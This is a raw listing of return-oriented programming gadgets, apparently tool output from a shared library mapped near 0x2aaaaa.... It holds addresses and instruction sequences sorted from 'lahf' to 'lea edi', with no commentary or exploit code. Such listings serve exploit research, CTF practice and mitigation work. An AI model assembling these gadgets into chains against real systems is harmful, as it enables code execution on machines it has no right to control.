0x00002aaaaac59703 : lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00002aaaaabcfaf0 : lahf ; mov edi, ebp ; call 0xf6d05
0x00002aaaaabea985 : lahf ; mov rax, rdi ; add rsp, 8 ; ret
0x00002aaaaac1fadd : lahf ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab215b6 : lahf ; ret
0x00002aaaaab4871e : lahf ; ret 0x3841
0x00002aaaaabd72be : lahf ; ret 0x3845
0x00002aaaaaba9fba : lahf ; ret 0x82eb
0x00002aaaaac56f5d : lahf ; ret 0x871e
0x00002aaaaabf1bbf : lahf ; ret 0xc2e9
0x00002aaaaab34c5c : lahf ; ret 0xd129
0x00002aaaaab36f72 : lahf ; ret 0xd329
0x00002aaaaab34ebc : lahf ; ret 0xd629
0x00002aaaaabd5f83 : lahf ; ret 0xe883
0x00002aaaaab7efe9 : lahf ; ret 0xea81
0x00002aaaaac09112 : lahf ; scasd eax, dword ptr [rdi] ; add eax, 0x3d8d4800 ; ret
0x00002aaaaac2016d : lar eax, word ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaabd6407 : lcall ptr [rax + 0x48] ; mov eax, ebx ; pop rdx ; pop rbx ; ret
0x00002aaaaac5be07 : lcall ptr [rax - 0x23] ; out dx, eax ; lcall ptr [rbx + rbx*8] ; out dx, eax ; jmp rsi
0x00002aaaaac5dddb : lcall ptr [rax] ; add eax, 0x518fff5 ; cmc ; call rax
0x00002aaaaac5dde7 : lcall ptr [rax] ; add eax, 0x518fff5 ; cmc ; jmp rax
0x00002aaaaac5de5f : lcall ptr [rax] ; add eax, 0x580fff5 ; cmc ; call rax
0x00002aaaaac5d62b : lcall ptr [rax] ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab48b9b : lcall ptr [rbp + 0x41] ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaabf7615 : lcall ptr [rbp + 0x41] ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaabf1535 : lcall ptr [rbp + 0x41] ; pop rsp ; pop r13 ; ret
0x00002aaaaab45b85 : lcall ptr [rbp + 0x41] ; pop rsp ; ret
0x00002aaaaac5caff : lcall ptr [rbp + 0x78fff37a] ; jge 0x187b02 ; jmp rdx
0x00002aaaaac5cafe : lcall ptr [rbp + 0x78fff37a] ; jge 0x187b03 ; jmp rdx
0x00002aaaaac6b6f3 : lcall ptr [rbp + rbx*4 + 0x50240000] ; jmp 0x196703
0x00002aaaaac6a80b : lcall ptr [rbp + rbx*4 - 0x62d30004] ; cld ; call rdx
0x00002aaaaac694cf : lcall ptr [rbp - 0x2e00024b] ; mov bh, 0xfd ; call rcx
0x00002aaaaac07a91 : lcall ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; ret
0x00002aaaaaaf4b73 : lcall ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00002aaaaaaf5e60 : lcall ptr [rbx + 0x41] ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaaaf60f8 : lcall ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaab48651 : lcall ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaafee13 : lcall ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; ret
0x00002aaaaab8aa21 : lcall ptr [rbx + 0x5d] ; pop r12 ; pop r14 ; ret
0x00002aaaaab0ecf2 : lcall ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab45450 : lcall ptr [rbx + 0x5d] ; ret
0x00002aaaaac5be0b : lcall ptr [rbx + rbx*8] ; out dx, eax ; jmp rsi
0x00002aaaaac6e32b : lcall ptr [rbx + rsi*4 + 1] ; add byte ptr [rbp + rdx*2 - 9], dh ; call rsp
0x00002aaaaab5aa2f : lcall ptr [rbx - 0x3d] ; mov eax, 0xfffffffe ; pop rbx ; ret
0x00002aaaaab9e02d : lcall ptr [rbx - 0x77] ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaac5d5cb : lcall ptr [rbx] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d6ef : lcall ptr [rbx] ; push rsp ; hlt ; jmp qword ptr [rip + 0x22fff454]
0x00002aaaaac5d5f7 : lcall ptr [rcx + 0x22fff451] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d803 : lcall ptr [rcx + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac6c0eb : lcall ptr [rcx + 0x6a440000] ; out dx, al ; jmp rsp
0x00002aaaaac5c717 : lcall ptr [rcx + rbp] ; jmp rsp
0x00002aaaaac5b977 : lcall ptr [rcx + rbx*2 - 0x12] ; jmp qword ptr [rsi]
0x00002aaaaabe5c5a : lcall ptr [rdi + 0xf] ; xchg eax, esp ; ret 0x840
0x00002aaaaac6bbab : lcall ptr [rdi + rdi*4 - 0x38bc0000] ; in eax, dx ; call rsp
0x00002aaaaac5cb7b : lcall ptr [rdx + 0x42fff383] ; mov dh, bl ; jmp rdx
0x00002aaaaac1101d : lcall ptr [rdx + 0x59] ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac6f6db : lcall ptr [rdx + rax*2 + 0x53440002] ; cli ; call rsp
0x00002aaaaac6b8db : lcall ptr [rdx + rbp*4 + 0x5d740000] ; in eax, dx ; jmp rsp
0x00002aaaaac5cbb3 : lcall ptr [rsi + rcx*4 - 0xd] ; jmp rdx
0x00002aaaaac5ec6f : lcall ptr [rsi + rdi*2 - 0xa] ; jmp rdx
0x00002aaaaac6fa3b : lcall ptr [rsi + rdx*2 - 0x40abfffe] ; cli ; jmp rsp
0x00002aaaaac6954f : lcall ptr [rsi - 0x49] ; std ; call rcx
0x00002aaaaac5d127 : lcall ptr [rsi - 0x53] ; jmp qword ptr [rdx]
0x00002aaaaac5c713 : lcall ptr [rsi] ; sub edx, esi ; lcall ptr [rcx + rbp] ; jmp rsp
0x00002aaaaac6c613 : lcall ptr [rsp + rax + 1] ; add byte ptr [rsp + rdx*4], dh ; out dx, eax ; call rsp
0x00002aaaaac6cbdb : lcall ptr [rsp + rbp + 0x52140001] ; call rsp
0x00002aaaaac6f2a3 : lcall ptr [rsp - 0x2efbfffe] ; stc ; call rsp
0x00002aaaaac2eed6 : lddqu xmm0, xmmword ptr [rsi - 0x10] ; movdqu xmmword ptr [rdi - 0x10], xmm0 ; ret
0x00002aaaaac2f6f6 : lddqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x00002aaaaab4e944 : lds r11d, ptr [r11 + 0x5d] ; pop r12 ; ret
0x00002aaaaab47d6f : lea eax, dword ptr [r8 - 1] ; ret
0x00002aaaaabf811c : lea eax, dword ptr [r9 + r8 + 2] ; pop rbx ; ret
0x00002aaaaab8f638 : lea eax, dword ptr [rax + rax - 1] ; ret
0x00002aaaaab62f94 : lea eax, dword ptr [rax + rdi + 0x10] ; ret
0x00002aaaaab62fa4 : lea eax, dword ptr [rax + rdi + 0x20] ; ret
0x00002aaaaab73554 : lea eax, dword ptr [rax + rdi + 0x30] ; ret
0x00002aaaaab62f74 : lea eax, dword ptr [rax + rdi - 0x10] ; ret
0x00002aaaaab9bdd2 : lea eax, dword ptr [rax + rdx*8] ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab47d70 : lea eax, dword ptr [rax - 1] ; ret
0x00002aaaaab7f087 : lea eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rbx + 0x25], bl ; add ah, bh ; add eax, dword ptr [rax] ; ret
0x00002aaaaabf82a0 : lea eax, dword ptr [rbp + rbx] ; pop rbx ; pop rbp ; ret
0x00002aaaaac0269b : lea eax, dword ptr [rbx + 0x2260] ; pop rbx ; ret
0x00002aaaaab80e38 : lea eax, dword ptr [rbx - 4] ; pop rbx ; ret
0x00002aaaaac31327 : lea eax, dword ptr [rbx] ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac86a5c : lea eax, dword ptr [rbx] ; mov es, word ptr [rdx] ; add ah, bh ; ret
0x00002aaaaab460ca : lea eax, dword ptr [rcx + 4] ; mov qword ptr [rdx + 0x20], rax ; mov dword ptr [rcx], edi ; mov eax, edi ; ret
0x00002aaaaabf811d : lea eax, dword ptr [rcx + rax + 2] ; pop rbx ; ret
0x00002aaaaab61a3d : lea eax, dword ptr [rcx + rsi] ; ret
0x00002aaaaab7e7d4 : lea eax, dword ptr [rcx - 1] ; ret
0x00002aaaaab7b8fc : lea eax, dword ptr [rdi + 0x10] ; ret
0x00002aaaaab7b911 : lea eax, dword ptr [rdi + 0x11] ; ret
0x00002aaaaab7b92f : lea eax, dword ptr [rdi + 0x12] ; ret
0x00002aaaaab7b94f : lea eax, dword ptr [rdi + 0x13] ; ret
0x00002aaaaab7b972 : lea eax, dword ptr [rdi + 0x14] ; ret
0x00002aaaaab7b991 : lea eax, dword ptr [rdi + 0x15] ; ret
0x00002aaaaab7b9b1 : lea eax, dword ptr [rdi + 0x16] ; ret
0x00002aaaaab7b9d1 : lea eax, dword ptr [rdi + 0x17] ; ret
0x00002aaaaab7b9f4 : lea eax, dword ptr [rdi + 0x18] ; ret
0x00002aaaaab7ba19 : lea eax, dword ptr [rdi + 0x19] ; ret
0x00002aaaaab7ba37 : lea eax, dword ptr [rdi + 0x1a] ; ret
0x00002aaaaab7ba57 : lea eax, dword ptr [rdi + 0x1b] ; ret
0x00002aaaaab7ba73 : lea eax, dword ptr [rdi + 0x1c] ; ret
0x00002aaaaab7ba93 : lea eax, dword ptr [rdi + 0x1d] ; ret
0x00002aaaaab7bab3 : lea eax, dword ptr [rdi + 0x1e] ; ret
0x00002aaaaab7bad3 : lea eax, dword ptr [rdi + 0x1f] ; ret
0x00002aaaaab7c923 : lea eax, dword ptr [rdi + 0x20] ; ret
0x00002aaaaab7cb89 : lea eax, dword ptr [rdi + 0x40] ; ret
0x00002aaaaab7b84d : lea eax, dword ptr [rdi + 0xa] ; ret
0x00002aaaaab7b86d : lea eax, dword ptr [rdi + 0xb] ; ret
0x00002aaaaab7b88f : lea eax, dword ptr [rdi + 0xc] ; ret
0x00002aaaaab7b8af : lea eax, dword ptr [rdi + 0xd] ; ret
0x00002aaaaab7b8cf : lea eax, dword ptr [rdi + 0xe] ; ret
0x00002aaaaab7b8e9 : lea eax, dword ptr [rdi + 0xf] ; ret
0x00002aaaaab72eb4 : lea eax, dword ptr [rdi + 1] ; ret
0x00002aaaaab72ec8 : lea eax, dword ptr [rdi + 2] ; ret
0x00002aaaaab72ed3 : lea eax, dword ptr [rdi + 3] ; ret
0x00002aaaaab72ee7 : lea eax, dword ptr [rdi + 4] ; ret
0x00002aaaaab72ef7 : lea eax, dword ptr [rdi + 5] ; ret
0x00002aaaaab72f07 : lea eax, dword ptr [rdi + 6] ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab7b7fb : lea eax, dword ptr [rdi + 6] ; ret
0x00002aaaaab72ea7 : lea eax, dword ptr [rdi + 7] ; ret
0x00002aaaaab7b81a : lea eax, dword ptr [rdi + 8] ; ret
0x00002aaaaabf7430 : lea eax, dword ptr [rdi + 9] ; and eax, 0xfffffff8 ; add eax, 0x10 ; ret
0x00002aaaaab7b82f : lea eax, dword ptr [rdi + 9] ; ret
0x00002aaaaab62fc9 : lea eax, dword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaab62fd9 : lea eax, dword ptr [rdi + rax + 0x20] ; ret
0x00002aaaaab62ec3 : lea eax, dword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaabf78e1 : lea eax, dword ptr [rdi + rax + 2] ; cmp rdx, rax ; sbb eax, eax ; ret
0x00002aaaaab5df4c : lea eax, dword ptr [rdi + rax] ; cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x00002aaaaab6abf7 : lea eax, dword ptr [rdi + rax] ; ret
0x00002aaaaac1ea7a : lea eax, dword ptr [rdi + rcx] ; sub rax, r8 ; ret
0x00002aaaaabf85a0 : lea eax, dword ptr [rdi + rsi + 8] ; ret
0x00002aaaaab02a65 : lea eax, dword ptr [rdi + rsi*4] ; mov eax, dword ptr [rax + rdx] ; ret
0x00002aaaaab61939 : lea eax, dword ptr [rdi + rsi] ; ret
0x00002aaaaab8088e : lea eax, dword ptr [rdi - 0x10] ; ret
0x00002aaaaab809f1 : lea eax, dword ptr [rdi - 0xc] ; ret
0x00002aaaaac485c9 : lea eax, dword ptr [rdi - 1] ; cmp rax, 0xfd ; ja 0x1735a3 ; call 0x1f8b3
0x00002aaaaab254c0 : lea eax, dword ptr [rdi - 1] ; xor edx, edx ; div ecx ; add eax, r8d ; ret
0x00002aaaaab80a11 : lea eax, dword ptr [rdi - 4] ; ret
0x00002aaaaab80a01 : lea eax, dword ptr [rdi - 8] ; ret
0x00002aaaaab7b783 : lea eax, dword ptr [rdi] ; ret
0x00002aaaaac90b16 : lea eax, dword ptr [rdi] ; rol byte ptr [rcx], cl ; ret 0xa
0x00002aaaaac3f4dd : lea eax, dword ptr [rdx + 0xa] ; ret
0x00002aaaaac3f4fd : lea eax, dword ptr [rdx + 0xb] ; ret
0x00002aaaaac3f51f : lea eax, dword ptr [rdx + 0xc] ; ret
0x00002aaaaac3f53f : lea eax, dword ptr [rdx + 0xd] ; ret
0x00002aaaaac417a7 : lea eax, dword ptr [rdx + 0xe] ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac3f55f : lea eax, dword ptr [rdx + 0xe] ; ret
0x00002aaaaac3f3ef : lea eax, dword ptr [rdx + 0xf] ; ret
0x00002aaaaab0b8b8 : lea eax, dword ptr [rdx + 1] ; mov dword ptr [rip + 0x38c7cb], eax ; mov eax, edx ; ret
0x00002aaaaac3f417 : lea eax, dword ptr [rdx + 1] ; ret
0x00002aaaaac3f42d : lea eax, dword ptr [rdx + 2] ; ret
0x00002aaaaac3f445 : lea eax, dword ptr [rdx + 3] ; ret
0x00002aaaaac3f45b : lea eax, dword ptr [rdx + 4] ; ret
0x00002aaaaac3f46d : lea eax, dword ptr [rdx + 5] ; ret
0x00002aaaaac3f48b : lea eax, dword ptr [rdx + 6] ; ret
0x00002aaaaac41852 : lea eax, dword ptr [rdx + 7] ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac3f397 : lea eax, dword ptr [rdx + 7] ; ret
0x00002aaaaac3f49d : lea eax, dword ptr [rdx + 8] ; ret
0x00002aaaaac3f4bd : lea eax, dword ptr [rdx + 9] ; ret
0x00002aaaaab47d5e : lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaab7f0bc : lea eax, dword ptr [rdx + rdx] ; pop rbx ; and eax, 0x7ff80000 ; ret
0x00002aaaaac3f405 : lea eax, dword ptr [rdx] ; ret
0x00002aaaaab5ffaa : lea eax, dword ptr [rip + 0x10] ; ret
0x00002aaaaab637a0 : lea eax, dword ptr [rip + 0x10e4a] ; ret
0x00002aaaaab01b39 : lea eax, dword ptr [rip + 0x15f406] ; ret
0x00002aaaaaaf5931 : lea eax, dword ptr [rip + 0x16b154] ; ret
0x00002aaaaaaf5941 : lea eax, dword ptr [rip + 0x16d066] ; ret
0x00002aaaaab5ff5e : lea eax, dword ptr [rip + 0x1713c] ; ret
0x00002aaaaab5dcfe : lea eax, dword ptr [rip + 0x1777c] ; ret
0x00002aaaaab6363a : lea eax, dword ptr [rip + 0x1b330] ; ret
0x00002aaaaab62a96 : lea eax, dword ptr [rip + 0x1ba24] ; cmove rax, rdx ; ret
0x00002aaaaab63014 : lea eax, dword ptr [rip + 0x26] ; ret
0x00002aaaaabffdc9 : lea eax, dword ptr [rip + 0x29cf71] ; pop rbx ; ret
0x00002aaaaabffd91 : lea eax, dword ptr [rip + 0x29cfa9] ; pop rbx ; ret
0x00002aaaaabffcd2 : lea eax, dword ptr [rip + 0x29d068] ; pop rbx ; ret
0x00002aaaaabd63cf : lea eax, dword ptr [rip + 0x2c4e4b] ; add rsp, 0x18 ; ret
0x00002aaaaabd637b : lea eax, dword ptr [rip + 0x2c4edf] ; pop rbp ; pop r12 ; ret
0x00002aaaaabd5e37 : lea eax, dword ptr [rip + 0x2c5393] ; add rsp, 8 ; ret
0x00002aaaaabd5dd8 : lea eax, dword ptr [rip + 0x2c5412] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd39c8 : lea eax, dword ptr [rip + 0x2c7652] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd273e : lea eax, dword ptr [rip + 0x2c8854] ; ret
0x00002aaaaabd257e : lea eax, dword ptr [rip + 0x2c8a14] ; ret
0x00002aaaaabd23ab : lea eax, dword ptr [rip + 0x2c8be7] ; add rsp, 8 ; ret
0x00002aaaaab8fc2d : lea eax, dword ptr [rip + 0x30ad8d] ; add rsp, 8 ; ret
0x00002aaaaab3fc84 : lea eax, dword ptr [rip + 0x35aa76] ; pop rbx ; pop rbp ; ret
0x00002aaaaabea681 : lea eax, dword ptr [rip + 0x37c19] ; ret
0x00002aaaaabea771 : lea eax, dword ptr [rip + 0x37ec9] ; ret
0x00002aaaaab1aaf3 : lea eax, dword ptr [rip + 0x37fb07] ; mov byte ptr [rax + rdx], 0 ; ret
0x00002aaaaab100e1 : lea eax, dword ptr [rip + 0x38d36f] ; add rsp, 8 ; ret
0x00002aaaaabff501 : lea eax, dword ptr [rip + 0x61a3e] ; ret
0x00002aaaaab63e3a : lea eax, dword ptr [rip + 0x80] ; ret
0x00002aaaaab6888f : lea eax, dword ptr [rip + 0xb3db] ; ret
0x00002aaaaab68860 : lea eax, dword ptr [rip + 0xb63a] ; ret
0x00002aaaaab688a3 : lea eax, dword ptr [rip + 0xbcb07] ; ret
0x00002aaaaab61eeb : lea eax, dword ptr [rip + 0xbcd7f] ; ret
0x00002aaaaab61b5b : lea eax, dword ptr [rip + 0xbcfdf] ; ret
0x00002aaaaab637e1 : lea eax, dword ptr [rip + 0xbee69] ; ret
0x00002aaaaab5f6eb : lea eax, dword ptr [rip + 0xbf30f] ; ret
0x00002aaaaab800ec : lea eax, dword ptr [rip + 0xc20ce] ; ret
0x00002aaaaab80cc8 : lea eax, dword ptr [rip + 0xc31b2] ; ret
0x00002aaaaab80cd0 : lea eax, dword ptr [rip + 0xc5a6a] ; ret
0x00002aaaaab5e14e : lea eax, dword ptr [rip + 0xc] ; ret
0x00002aaaaab6183e : lea eax, dword ptr [rip + 0xd999c] ; ret
0x00002aaaaab63e9d : lea eax, dword ptr [rip + 0xd] ; ret
0x00002aaaaab63cce : lea eax, dword ptr [rip + 0xda08c] ; ret
0x00002aaaaab5f5de : lea eax, dword ptr [rip + 0xda44c] ; ret
0x00002aaaaab63dee : lea eax, dword ptr [rip + 0xdb77c] ; ret
0x00002aaaaab63028 : lea eax, dword ptr [rip + 0xdf812] ; ret
0x00002aaaaab63030 : lea eax, dword ptr [rip + 0xe1f9a] ; ret
0x00002aaaaab5deeb : lea eax, dword ptr [rip + 0xe6dbf] ; ret
0x00002aaaaab80cb4 : lea eax, dword ptr [rip + 0xe916] ; ret
0x00002aaaaab800e4 : lea eax, dword ptr [rip + 0xf596] ; ret
0x00002aaaaab2b9f6 : lea eax, dword ptr [rip - 0x2fa] ; add rax, rdx ; jmp rax
0x00002aaaaabcae86 : lea eax, dword ptr [rip - 0x4c] ; cmove rax, rdx ; ret
0x00002aaaaac0b20d : lea eax, dword ptr [rip - 0x6803] ; mov rdi, rax ; call qword ptr [r10]
0x00002aaaaabea7ba : lea eax, dword ptr [rip - 0x6be60] ; ret
0x00002aaaaabea730 : lea eax, dword ptr [rip - 0x76156] ; ret
0x00002aaaaabea640 : lea eax, dword ptr [rip - 0x767b6] ; ret
0x00002aaaaabf83fe : lea eax, dword ptr [rsi + 8] ; ret
0x00002aaaaac7c2af : lea eax, dword ptr [rsi + rcx*4] ; add ecx, dword ptr [rdi + 0x380e4402] ; ret
0x00002aaaaac7b3b5 : lea eax, dword ptr [rsi + rcx*4] ; add ecx, dword ptr [rdi + 0x80e6a02] ; ret
0x00002aaaaac8fa1a : lea eax, dword ptr [rsi + rcx*4] ; add ecx, dword ptr [rdi + 0x80e7002] ; ret
0x00002aaaaac106f7 : lea eax, dword ptr [rsp + 0x30] ; mov qword ptr [rsp + 8], rax ; xor eax, eax ; call rdx
0x00002aaaaaafea6b : lea eax, dword ptr [rsp + 0x98] ; xor r9d, r9d ; call r15
0x00002aaaaab505d8 : lea ebp, dword ptr [rdi + 0x83] ; jmp 0x7b5c6
0x00002aaaaab1ab5f : lea ebp, dword ptr [rdi - 2] ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab6b28a : lea ebp, dword ptr [rdx - 1] ; ja 0x96272 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1c071 : lea ebx, dword ptr [rax + 1] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab2e8fb : lea ebx, dword ptr [rax - 0x7b000011] ; ror byte ptr [rdi], 0x94 ; ret 0x7f3c
0x00002aaaaab1c061 : lea ebx, dword ptr [rip + 0x146ad7] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabda279 : lea ebx, dword ptr [rip + 0x888bf] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaac57811 : lea ebx, dword ptr [rsi - 0x3271f33] ; test al, 0x97 ; xchg eax, esp ; ret
0x00002aaaaab81003 : lea ecx, dword ptr [rax + 1] ; call rbx
0x00002aaaaabe2b56 : lea ecx, dword ptr [rax + 1] ; mov qword ptr [rdi + 0x28], rcx ; mov byte ptr [rax], 0x20 ; jmp 0x10db30
0x00002aaaaab8112e : lea ecx, dword ptr [rax + 4] ; call rbx
0x00002aaaaab8156e : lea ecx, dword ptr [rax + 4] ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x00002aaaaab46f82 : lea ecx, dword ptr [rax + 4] ; mov qword ptr [rdx], rcx ; mov edx, dword ptr [rax] ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab92fb4 : lea ecx, dword ptr [rax] ; mov rdx, rax ; jmp 0xbdfc5
0x00002aaaaac90abe : lea ecx, dword ptr [rax] ; rol byte ptr [rcx], cl ; ret 0xb
0x00002aaaaab4142d : lea ecx, dword ptr [rbx + 0x40] ; mov esi, 1 ; mov rdi, rbx ; call rax
0x00002aaaaac25430 : lea ecx, dword ptr [rbx + rcx] ; jmp r9
0x00002aaaaab7a03e : lea ecx, dword ptr [rbx + rcx] ; jmp rcx
0x00002aaaaac258f1 : lea ecx, dword ptr [rcx - 7] ; lea rdx, qword ptr [rdx - 0x40] ; jmp r9
0x00002aaaaac3cce6 : lea ecx, dword ptr [rdx + 0x10] ; jne 0x168239 ; ret
0x00002aaaaac3cfe4 : lea ecx, dword ptr [rdx + 0xa] ; jne 0x168239 ; ret
0x00002aaaaac3d004 : lea ecx, dword ptr [rdx + 0xb] ; jne 0x168239 ; ret
0x00002aaaaac3d024 : lea ecx, dword ptr [rdx + 0xc] ; jne 0x168239 ; ret
0x00002aaaaac3d046 : lea ecx, dword ptr [rdx + 0xd] ; jne 0x168239 ; ret
0x00002aaaaac3d066 : lea ecx, dword ptr [rdx + 0xe] ; jne 0x168239 ; ret
0x00002aaaaac3d086 : lea ecx, dword ptr [rdx + 0xf] ; jne 0x168239 ; ret
0x00002aaaaac3cedc : lea ecx, dword ptr [rdx + 1] ; jne 0x168239 ; ret
0x00002aaaaac3cefe : lea ecx, dword ptr [rdx + 2] ; jne 0x168239 ; ret
0x00002aaaaac3cf24 : lea ecx, dword ptr [rdx + 3] ; jne 0x168239 ; ret
0x00002aaaaac3cf3c : lea ecx, dword ptr [rdx + 4] ; jne 0x168239 ; ret
0x00002aaaaab47161 : lea ecx, dword ptr [rdx + 4] ; mov qword ptr [rax], rcx ; mov eax, dword ptr [rdx] ; pop rbx ; ret
0x00002aaaaab455c6 : lea ecx, dword ptr [rdx + 4] ; mov qword ptr [rax], rcx ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaac3cf62 : lea ecx, dword ptr [rdx + 5] ; jne 0x168239 ; ret
0x00002aaaaac3cf84 : lea ecx, dword ptr [rdx + 6] ; jne 0x168239 ; ret
0x00002aaaaac3cfa2 : lea ecx, dword ptr [rdx + 7] ; jne 0x168239 ; ret
0x00002aaaaac3cc7e : lea ecx, dword ptr [rdx + 8] ; jne 0x168239 ; ret
0x00002aaaaac3cfc4 : lea ecx, dword ptr [rdx + 9] ; jne 0x168239 ; ret
0x00002aaaaab1d390 : lea ecx, dword ptr [rdx] ; jmp 0x483e6
0x00002aaaaab1ef70 : lea ecx, dword ptr [rdx] ; jmp 0x49fc6
0x00002aaaaab5cca1 : lea ecx, dword ptr [rip + 0x10429e] ; mov rdx, rcx ; jmp 0x87c78
0x00002aaaaab2e878 : lea ecx, dword ptr [rip - 0x7cc] ; add rax, rcx ; jmp rax
0x00002aaaaabdf1b7 : lea ecx, dword ptr [rsi + rcx*4] ; add eax, dword ptr [rcx + rdx] ; ret
0x00002aaaaac0b309 : lea ecx, dword ptr [rsp + 0x10] ; call qword ptr [r10]
0x00002aaaaab49fe4 : lea ecx, dword ptr [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x00002aaaaac00ed8 : lea ecx, dword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaab4a0c0 : lea ecx, dword ptr [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x00002aaaaac0b11a : lea ecx, dword ptr [rsp + 0x1c] ; call qword ptr [r10]
0x00002aaaaac00de6 : lea ecx, dword ptr [rsp + 0x1c] ; call qword ptr [rax]
0x00002aaaaab814c9 : lea ecx, dword ptr [rsp + 0x20] ; call rbx
0x00002aaaaab81129 : lea ecx, dword ptr [rsp + 0x20] ; lea rcx, qword ptr [rax + 4] ; call rbx
0x00002aaaaab80ffe : lea ecx, dword ptr [rsp + 0x28] ; lea rcx, qword ptr [rax + 1] ; call rbx
0x00002aaaaac0c4b2 : lea ecx, dword ptr [rsp + 0x2a] ; call qword ptr [rax]
0x00002aaaaac00c0c : lea ecx, dword ptr [rsp + 0x2c] ; call qword ptr [rax]
0x00002aaaaac0137b : lea ecx, dword ptr [rsp + 0x30] ; call qword ptr [rax]
0x00002aaaaab8f46c : lea ecx, dword ptr [rsp + 0x30] ; mov rdi, qword ptr [rax] ; call r14
0x00002aaaaab819aa : lea ecx, dword ptr [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x00002aaaaac0c273 : lea ecx, dword ptr [rsp + 0x3a] ; call qword ptr [rax]
0x00002aaaaab81c6b : lea ecx, dword ptr [rsp + 0x70] ; mov rdi, r12 ; call rbx
0x00002aaaaab816e1 : lea ecx, dword ptr [rsp + 0x70] ; mov rdi, rbp ; call rbx
0x00002aaaaac0723e : lea edi, dword ptr [rbp + 0x10] ; call rax
0x00002aaaaac09e42 : lea edi, dword ptr [rbx + 0x58] ; call rax
0x00002aaaaac09422 : lea edi, dword ptr [rbx + 0x68] ; call rax
0x00002aaaaac066a5 : lea edi, dword ptr [rbx + 0xc8] ; call rax
0x00002aaaaab0dfec : lea edi, dword ptr [rbx + rsi] ; call rax
0x00002aaaaabd8d17 : lea edi, dword ptr [rbx - 0x74b6000f] ; cmp al, 0x24 ; call rbx
0x00002aaaaab63876 : lea edi, dword ptr [rdi + 0x10] ; jne 0x8e868 ; mov rax, rdi ; ret
0x00002aaaaab68936 : lea edi, dword ptr [rdi + 0x10] ; jne 0x93926 ; ret
0x00002aaaaab7abad : lea edi, dword ptr [rdi + 0x10] ; jne 0xa6289 ; ret
0x00002aaaaab7c291 : lea edi, dword ptr [rdi + 0x10] ; jne 0xa7a99 ; ret
0x00002aaaaab7abd0 : lea edi, dword ptr [rdi + 0x11] ; jne 0xa6289 ; ret
0x00002aaaaab7c2b4 : lea edi, dword ptr [rdi + 0x11] ; jne 0xa7a99 ; ret
0x00002aaaaab7abf5 : lea edi, dword ptr [rdi + 0x12] ; jne 0xa6289 ; ret
0x00002aaaaab7c2d9 : lea edi, dword ptr [rdi + 0x12] ; jne 0xa7a99 ; ret
0x00002aaaaab7ac13 : lea edi, dword ptr [rdi + 0x13] ; jne 0xa6289 ; ret
0x00002aaaaab7c307 : lea edi, dword ptr [rdi + 0x13] ; jne 0xa7a99 ; ret
0x00002aaaaab7ac33 : lea edi, dword ptr [rdi + 0x14] ; jne 0xa6289 ; ret
0x00002aaaaab7c337 : lea edi, dword ptr [rdi + 0x14] ; jne 0xa7a99 ; ret
0x00002aaaaab7ac56 : lea edi, dword ptr [rdi + 0x15] ; jne 0xa6289 ; ret
0x00002aaaaab7c36a : lea edi, dword ptr [rdi + 0x15] ; jne 0xa7a99 ; ret
0x00002aaaaab7ac75 : lea edi, dword ptr [rdi + 0x16] ; jne 0xa6289 ; ret
0x00002aaaaab7c399 : lea edi, dword ptr [rdi + 0x16] ; jne 0xa7a99 ; ret
0x00002aaaaab7ac95 : lea edi, dword ptr [rdi + 0x17] ; jne 0xa6289 ; ret
0x00002aaaaab7c3c9 : lea edi, dword ptr [rdi + 0x17] ; jne 0xa7a99 ; ret
0x00002aaaaab7acb5 : lea edi, dword ptr [rdi + 0x18] ; jne 0xa6289 ; ret
0x00002aaaaab7c3f9 : lea edi, dword ptr [rdi + 0x18] ; jne 0xa7a99 ; ret
